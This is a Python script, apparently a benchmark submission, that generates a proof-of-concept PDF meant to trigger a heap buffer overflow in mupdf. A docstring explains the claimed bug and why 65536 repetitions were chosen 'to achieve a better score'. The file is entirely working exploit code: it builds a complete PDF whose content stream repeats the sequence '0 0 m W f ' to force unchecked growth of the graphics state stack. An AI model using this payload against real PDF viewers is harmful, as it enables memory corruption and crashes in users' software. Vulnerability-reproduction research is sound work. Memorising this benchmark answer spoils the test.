import zlib

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generates a Proof-of-Concept (PoC) that triggers a Heap Buffer Overflow
        in mupdf (oss-fuzz:42537171).

        The vulnerability is caused by an unchecked growth of the graphics state
        stack. The PDF clipping path operator `W` increments an internal counter,
        `clip_depth`. When a subsequent path-painting operator like `f` (fill) is
        processed while `clip_depth` is positive, a vulnerable code path is
        triggered. This path saves the current graphics state but never restores it.

        The PoC creates a PDF with a content stream containing a large number of
        repetitions of the sequence "0 0 m W f ". Each repetition causes the
        graphics state stack, a heap-allocated buffer, to grow by one element.
        This eventually leads to a heap buffer overflow during reallocation of the
        stack buffer.

        A repetition count of 65536 is chosen. This is a large number, likely
        sufficient to trigger the memory corruption, while being smaller than
        the original fuzzer-generated PoC to achieve a better score.
        """
        repeats = 65536
        
        payload = b'0 0 m W f ' * repeats

        stream = payload
        stream_len = len(stream)

        objs = []
        # Object 1: Document Catalog
        objs.append(b"<< /Type /Catalog /Pages 2 0 R >>")
        # Object 2: Page Tree
        objs.append(b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>")
        # Object 3: Page Object
        objs.append(b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 1 1] /Contents 4 0 R >>")
        # Object 4: Content Stream
        objs.append(f"<< /Length {stream_len} >>".encode() + b"\nstream\n" + stream + b"\nendstream")

        pdf_parts = [b"%PDF-1.7\n"]
        offsets = []
        
        for i, obj_body in enumerate(objs):
            offsets.append(len(b"".join(pdf_parts)))
            obj_num = i + 1
            pdf_parts.append(f"{obj_num} 0 obj\n".encode())
            pdf_parts.append(obj_body)
            pdf_parts.append(b"\nendobj\n")

        xref_offset = len(b"".join(pdf_parts))
        
        pdf_parts.append(b"xref\n")
        pdf_parts.append(f"0 {len(objs) + 1}\n".encode())
        pdf_parts.append(b"0000000000 65535 f \n")
        for offset in offsets:
            pdf_parts.append(f"{offset:010d} 00000 n \n".encode())

        pdf_parts.append(b"trailer\n")
        pdf_parts.append(f"<< /Size {len(objs) + 1} /Root 1 0 R >>\n".encode())
        pdf_parts.append(b"startxref\n")
        pdf_parts.append(f"{xref_offset}\n".encode())
        pdf_parts.append(b"%%EOF")

        return b"".join(pdf_parts)
